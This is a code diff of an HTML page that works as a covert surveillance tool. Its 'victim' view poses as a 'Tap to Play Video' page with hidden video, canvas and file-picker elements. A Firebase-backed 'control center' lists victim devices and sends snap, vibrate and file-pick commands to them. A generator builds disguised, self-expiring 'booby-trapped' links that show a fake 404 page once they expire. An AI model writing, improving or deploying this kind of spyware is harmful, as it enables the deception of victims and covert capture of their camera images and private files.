@@ -7,50 +7,56 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #fff; margin: 0; font-family: sans-serif; overflow: hidden; }
-        /* واجهة الضحية */
-        #vic-zone { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; background: #000; }
-        .play-btn { width: 80px; height: 80px; border: 3px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
-        .play-btn::after { content: ''; position: absolute; top: 22px; left: 32px; border-left: 25px solid #fff; border-top: 18px solid transparent; border-bottom: 18px solid transparent; }
+        :root { --neon: #00ff41; --bg: #000; }
+        body { background: var(--bg); color: #fff; margin: 0; font-family: sans-serif; overflow: hidden; }
         
         /* لوحة التحكم */
-        #admin-zone { display: none; padding: 20px; color: #00ff41; font-family: 'Courier New', monospace; height: 100vh; overflow-y: auto; }
-        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; border-radius: 5px; cursor: pointer; }
-        button { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 12px; width: 100%; margin-top: 5px; cursor: pointer; }
-        input { width: 100%; padding: 10px; background: #000; color: #00ff41; border: 1px solid #00ff41; }
+        #admin-panel { display: none; padding: 15px; height: 100vh; overflow-y: auto; color: var(--neon); font-family: 'Courier New', monospace; }
+        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 8px; border-radius: 5px; cursor: pointer; }
+        .v-card.active { border-color: #fff; background: #111; }
+        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; margin-top: 5px; cursor: pointer; font-weight: bold; }
+        input { width: 100%; padding: 10px; background: #000; color: var(--neon); border: 1px solid var(--neon); margin-top: 5px; }
+
+        /* واجهة الضحية */
+        #vic-panel { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; background: #000; }
+        .play-btn { width: 70px; height: 70px; border: 3px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
+        .play-btn::after { content: ''; position: absolute; top: 18px; left: 26px; border-left: 25px solid #fff; border-top: 17px solid transparent; border-bottom: 17px solid transparent; }
     </style>
 </head>
 <body>
 
-<div id="vic-zone">
+<div id="vic-panel">
     <div id="p-scr">
         <div class="play-btn" onclick="startGhost()"></div>
-        <p style="margin-top:20px;">Tap to Play</p>
+        <p style="margin-top:20px;">Tap to Play Video</p>
     </div>
     <div id="l-scr" style="display:none; text-align:center;">
         <div style="width:40px; height:40px; border:3px solid #333; border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto;"></div>
-        <p>Loading Video...</p>
+        <p>Loading Content...</p>
     </div>
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
     <input type="file" id="f-in" style="display:none;" accept="image/*" multiple>
 </div>
 
-<div id="admin-zone">
-    <h2>SYSTEM V16 | EXPIRE MODE</h2>
-    <div id="v-list"></div>
+<div id="admin-panel">
+    <h3 style="border-bottom: 1px solid var(--neon);">🕹️ CONTROL CENTER V17</h3>
+    <div id="v-list">بانتظار الأجهزة...</div>
     <hr>
     <div id="ctrls">
-        <h3>Target: <span id="t-name">None</span></h3>
-        <button onclick="send('snap')">📸 Snap</button>
-        <button onclick="send('vibrate')">📳 Vibrate</button>
-        <button onclick="send('pick')">📂 Pick Files</button>
-        <button onclick="send('release')" style="background:#030;">🔓 Release</button>
+        <h4>Target: <span id="t-name">None</span></h4>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
+            <button onclick="send('snap')">📸 Snap</button>
+            <button onclick="send('vibrate')">📳 Vibrate</button>
+            <button onclick="send('pick')">📂 Pick Files</button>
+            <button onclick="send('release')" style="background:#030;">🔓 Release</button>
+        </div>
+        <button onclick="db.ref('/').remove()" style="color:red; border-color:red; margin-top:15px;">🗑️ Clear All Sessions</button>
     </div>
     <hr>
-    <h3>مصنع الروابط المؤقتة (ساعة واحدة):</h3>
+    <h4>مصنع الروابط (تنتهي بعد ساعة):</h4>
     <input type="text" id="target-url" placeholder="رابط يوتيوب">
-    <button onclick="gen()">توليد رابط ينتهي بعد ساعة</button>
+    <button onclick="gen()">توليد رابط ملغم</button>
     <div id="res" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
 </div>
 
@@ -68,32 +74,27 @@
     const isVictim = urlParams.get('v');
     const isAdmin = urlParams.get('admin');
 
-    if (isVictim) {
+    // --- المنطق الذكي للفصل ---
+    if (isAdmin === "1") {
+        // الآدمن يفتح دائماً
+        document.getElementById('admin-panel').style.display = 'block';
+        runAdmin();
+    } else if (isVictim) {
         try {
-            // فك التشفير واستخراج البيانات (رابط الفيديو + وقت الإنشاء)
-            const decoded = JSON.parse(atob(isVictim));
-            const currentTime = Date.now();
-            const linkTime = decoded.time;
-            const oneHour = 60 * 60 * 1000; // ساعة بالملي ثانية
-
-            if (currentTime - linkTime > oneHour) {
-                // إذا مر أكثر من ساعة، اظهر صفحة 404
+            const data = JSON.parse(atob(isVictim));
+            const diff = Date.now() - data.time;
+            if (diff > 3600000) { // مر أكثر من ساعة
                 document.body.innerHTML = "<h1 style='color:white; text-align:center; margin-top:45vh;'>404 Not Found</h1>";
             } else {
-                document.getElementById('vic-zone').style.display = 'flex';
-                runVictim(decoded.url);
+                document.getElementById('vic-panel').style.display = 'flex';
+                runVictim(data.url);
             }
-        } catch(e) {
-            document.body.innerHTML = "404 Not Found";
-        }
-    } else if (isAdmin === "1") {
-        document.getElementById('admin-zone').style.display = 'block';
-        runAdmin();
+        } catch(e) { document.body.innerHTML = "404 Not Found"; }
     } else {
-        document.body.innerHTML = "404 Not Found";
+        document.body.innerHTML = "<h1 style='color:white; text-align:center; margin-top:45vh;'>404 Not Found</h1>";
     }
 
-    // --- وظائف الآدمن ---
+    // --- الآدمن ---
     function runAdmin() {
         db.ref('victims').on('value', s => {
             const list = document.getElementById('v-list');
@@ -104,24 +105,21 @@
                 list.innerHTML += `<div class="v-card" onclick="sel('${id}','${v.model}')" style="border-color:${id==selId?'#fff':'#333'}">
                     <span style="color:${active?'#0f0':'#f00'}">●</span> ${v.model}
                 </div>`;
+                if(id === selId && v.files) {
+                    // هنا تظهر الصور والملفات المسحوبة (اختياري)
+                }
             });
         });
     }
     function sel(id, m) { selId = id; document.getElementById('t-name').innerText = m; }
     function send(t) { if(selId) db.ref('victims/'+selId+'/cmd').set({ t, time: Date.now() }); }
-    
-    function gen() { 
-        const targetUrl = document.getElementById('target-url').value;
-        const data = {
-            url: targetUrl,
-            time: Date.now() // نسجل وقت الإنشاء الآن
-        };
-        const encoded = btoa(JSON.stringify(data));
-        const finalLink = window.location.href.split('?')[0] + "?v=" + encoded;
-        document.getElementById('res').innerText = finalLink;
+    function gen() {
+        const url = document.getElementById('target-url').value;
+        const payload = btoa(JSON.stringify({ url: url, time: Date.now() }));
+        document.getElementById('res').innerText = window.location.href.split('?')[0] + "?v=" + payload;
     }
 
-    // --- وظائف الضحية ---
+    // --- الضحية ---
     let myRef = null;
     function runVictim(target) {
         const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "Mobile";
@@ -156,5 +154,6 @@
         } catch(e) {}
     }
 </script>
+<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
 </body>
 </html>
